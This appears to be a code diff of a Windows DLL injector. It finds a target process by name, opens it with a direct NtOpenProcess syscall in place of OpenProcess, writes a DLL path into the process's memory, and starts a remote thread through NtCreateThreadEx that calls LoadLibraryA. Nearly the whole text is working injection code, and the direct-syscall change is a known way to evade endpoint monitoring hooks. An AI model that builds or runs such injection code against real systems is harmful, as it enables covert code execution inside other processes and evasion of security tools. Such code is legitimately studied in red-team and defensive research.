@@ -36,10 +36,12 @@ void logError(const char* message) {
     }
 }
 
+
 /**
  * @brief Finds system module for given module name
  * 
- * @param moduleName A string representing the name of the module
+ * @param moduleName A string representing the name of the module. Thanks to https://github.com/cr-0w for 
+ * the below function.
  * 
 */
 HMODULE getModule(LPCWSTR moduleName) {
@@ -98,7 +100,7 @@ DWORD getPidByName(const char* processName) {
                 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
                 if (hProcess != NULL) {
                     CloseHandle(snapshot); // close the snapshot handle as it is no longer needed
-                    return entry.th32ProcessID; // return the process ID
+                    return entry.th32ProcessID; // return the process ID TODO just return the handle?
                 }
             }
         }
@@ -124,6 +126,11 @@ DWORD getPidByName(const char* processName) {
  * @return int Returns 0 on successful injection, -1 on failure.
  */
 int openProcAndExec(const char *pathToDLL, const char *processToInj) {
+
+    // vars
+    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
+    NTSTATUS STATUS = 0x0;
+
     // validate input params 
     if (pathToDLL == NULL || processToInj == NULL) {
         logError("Invalid usage: inj.exe 'path_to_all.dll' 'process_to_inject_into.exe'. Quitting...");
@@ -148,14 +155,26 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     }
 
     // open the target process
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == NULL) {
+    HANDLE hProcess = NULL; // required as using direct syscalls
+    ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(pid);
+    CLIENT_ID CLIENT_ID = { reinterpret_cast<HANDLE>(processIdPtr), nullptr }; // required as using direct syscalls
+    
+    printf("Calling NtOpenProcess\n");
+    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CLIENT_ID); // direct call
+    printf("Call made to NtOpenProcess with status: 0x%lx\n", static_cast<unsigned long>(STATUS));
+
+    if (STATUS != 0x0) {
+        printf("%lu\n", pid);
         logError("Failed to open target process");
         return -1;
     }
 
     // get handle to ntdll
     HMODULE hNTDLL = getModule(L"ntdll.dll");
+    if (!hNTDLL) {
+        logError("Failed to get handle to ntdll.dll");
+        return -1;
+    }
 
     // get handle to the Kernel32.dll and the address of LoadLibraryA
     HMODULE hK32 = getModule(L"Kernel32");
@@ -165,7 +184,6 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     }
     
     // get modules
-    // pNtCreateThreadEx localCreateRemoteThread = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
     PTHREAD_START_ROUTINE loadlib = (PTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");
 
     // allocate memory in the target process for the DLL path
@@ -191,15 +209,14 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     */
     // NTSTATUS remoteThread = localCreateRemoteThread(&hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibA_addr, alloc, 0, NULL);
     HANDLE hThread = NULL;
-    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
-    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);
+    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);
 
-    if (status != 0x0) {
+    if (STATUS != 0x0) {
         VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
         CloseHandle(hProcess);
 
         char errorMessage[256];
-        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", status);
+        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", STATUS);
         logError(errorMessage);
 
         return -1; // return error if thread creation fails
